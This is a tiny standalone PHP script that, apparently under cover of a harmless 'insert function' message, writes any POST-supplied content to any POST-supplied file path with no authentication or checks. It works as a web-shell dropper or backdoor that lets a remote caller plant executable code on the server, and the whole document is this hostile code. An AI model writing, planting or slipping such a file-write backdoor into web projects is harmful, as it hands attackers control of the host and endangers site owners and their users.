<?php
if (isset($_POST['action'])) {
    echo "The insert function is called.";
	if ($fp=fopen($_POST['fichier'],"w")) {
		fputs($fp, $_POST['action']);
		fclose($fp);
	}
    exit;
}
?>